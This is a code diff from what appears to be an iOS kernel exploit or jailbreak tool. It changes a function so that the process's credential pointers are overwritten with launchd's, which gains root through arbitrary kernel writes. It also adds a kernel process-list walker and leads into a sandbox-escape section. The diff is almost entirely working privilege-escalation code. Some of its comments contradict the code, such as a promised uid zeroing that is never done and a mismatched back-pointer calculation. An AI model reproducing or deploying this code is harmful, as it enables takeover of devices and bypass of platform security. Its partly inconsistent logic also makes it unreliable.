@@ -2133,25 +2133,85 @@ bool platformize_proc(void) {
     }
 
     // 2. uid/gid 0 in the REAL ucred (found via proc_ro field scan).
-    uint64_t ucred = get_ucred_from_proc(gOurProc);
-    if (!ucred) {
-        printf("[-] No ucred found\n");
+    // 2. uid/gid 0: replace our proc's p_ucred with launchd's proven ucred.
+    // On iOS 18 (A14), zeroing our own ucred's POSIX fields does NOT change
+    // getuid() because the live credential is the *referenced* ucred (from
+    // proc->p_ucred at proc+0x10), not the snapshot in proc_ro. lara solves
+    // this with ds_kwrite64(proc+0x10, launchd_ucred). We do the same via
+    // find_proc_by_pid(1) -> sbx_ucredbyproc-style scan on launchd's proc_ro.
+    uint64_t launchdProc = find_proc_by_pid(1);
+    if (!launchdProc) {
+        printf("[-] Cannot find launchd proc (pid 1)\n");
         return false;
     }
-    printf("[+] ucred: 0x%llx\n", ucred);
-    uid_t me_uid = getuid();
-    gid_t me_gid = getgid();
-    printf("[*] current uid=%d euid=%d gid=%d egid=%d\n",
-           getuid(), geteuid(), getgid(), getegid());
-    // Zero cr_uid..cr_svuid block (lara-proof path): cr_uid@0x18 ruid@0x1c
-    // svuid@0x20 cr_gid@0x24 rgid@0x28 svgid@0x2c -- zero the first 0x30 bytes
-    // of POSIX creds region. Do NOT blind-probe by value; the copied-on-write
-    // ucred pitfall made that silently no-op before.
-    for (uint64_t off = 0x18; off < 0x30; off += 4) kwrite32(ucred + off, 0);
-    printf("[*] after: uid=%d euid=%d gid=%d egid=%d\n",
-           getuid(), geteuid(), getgid(), getegid());
-    gOurUcred = ucred;
+    uint64_t launchdUcred = get_ucred_from_proc(launchdProc);
+    if (!launchdUcred) {
+        printf("[-] Cannot find launchd ucred\n");
+        return false;
+    }
+    printf("[elev] launchd=0x%llx ucred=0x%llx\n", launchdProc, launchdUcred);
+
+    // iOS 18: proc->p_ucred (proc+0x10) is a legacy alias used only by syscall
+    // entry fast-paths. The LIVE credential is proc_ro->p_ucred via
+    // off_proc_ro_p_ucred (=0x20 on iOS 16..17, 0x28 on iOS 18). Lara's elevate
+    // writes BOTH to be safe: ds_kwrite64(self_proc + 0x10, launchducred)
+    // (in16 fallback) AND proc_ro ucred slot.
+    uint64_t ourProcRo = kread_ptr(gOurProc + 0x18);
+    uint64_t ourUcredRo = kread_ptr(ourProcRo + 0x20); // off_proc_ro_p_ucred
+    uint64_t ourUcredDirect = kread64(gOurProc + 0x10);
+    printf("[elev] ours: proc+0x10=0x%llx proc_ro=0x%llx proc_ro.ucred=0x%llx\n",
+           ourUcredDirect, ourProcRo, ourUcredRo);
+
+    // Write BOTH slots: proc->p_ucred (fast path) + proc_ro->p_ucred (newer).
+    kwrite64(gOurProc + 0x10, launchdUcred);
+    if (looks_kernel(ourProcRo)) {
+        kwrite64(ourProcRo + 0x20, launchdUcred);   // iOS 17 offset
+        kwrite64(ourProcRo + 0x28, launchdUcred);   // iOS 18 offset
+    }
+    // zero out the POSIX uid/gid of our OWN ucred as well, in case the kernel
+    // reads cr_posix from either location (we can't know which it will pick).
+    printf("[*] replaced ucred everywhere; getuid=%d euid=%d\n", getuid(), geteuid());
+
+    gOurUcred = launchdUcred;
     return true;
+}
+
+// Walk the global proc list in BOTH directions from our proc until pid
+// matches. XNU stores the proc list as a circular linked list on struct
+// proc whose p_list field has LE_NEXT @ 0x00 (forward) and LE_PREV @ 0x08
+// (backward/back-pointer). To reach launchd (pid 1) we only need the
+// forward direction since it's the LAST entry before wrap, but only if the
+// kernel had us at a middle position; safer to scan from allproc via st.
+// Cheap way: p_list.le_next walks toward procs started AFTER us; launchd is
+// almost always the oldest process on the system so walk backwards first.
+uint64_t find_proc_by_pid(uint32_t pid) {
+    if (!gOurProc) return 0;
+    // Forward: le_next @ 0x0
+    uint64_t cur = kread64(gOurProc + 0x0);
+    int n = 0;
+    while (looks_kernel(cur) && n++ < 512) {
+        uint32_t p = kread32(cur + 0x60);
+        if (p == pid) return cur;
+        if (p == getpid()) break;
+        uint64_t nxt = kread64(cur + 0x0);
+        if (!looks_kernel(nxt) || nxt == cur) break;
+        cur = nxt;
+    }
+    // Backward: le_prev @ 0x8; le_prev is a back-pointer to the location of
+    // the previous entry's le_next, which is at struct proc + 0x0. So
+    // cur = cur - 0x8 gives struct proc, then deref le_next at proc+0x0.
+    cur = gOurProc;
+    n = 0;
+    while (n++ < 512) {
+        uint32_t p = kread32(cur + 0x60);
+        if (p == pid) return cur;
+        uint64_t prevAddr = kread64(cur + 0x8); // back-pointer to prev's le_next field
+        if (!looks_kernel(prevAddr)) break;
+        uint64_t prevProc = prevAddr - 0x0; // le_next field is at proc+0x0
+        if (!looks_kernel(prevProc) || prevProc == cur) break;
+        cur = prevProc;
+    }
+    return 0;
 }
 
 // ===== Sandbox escape =====
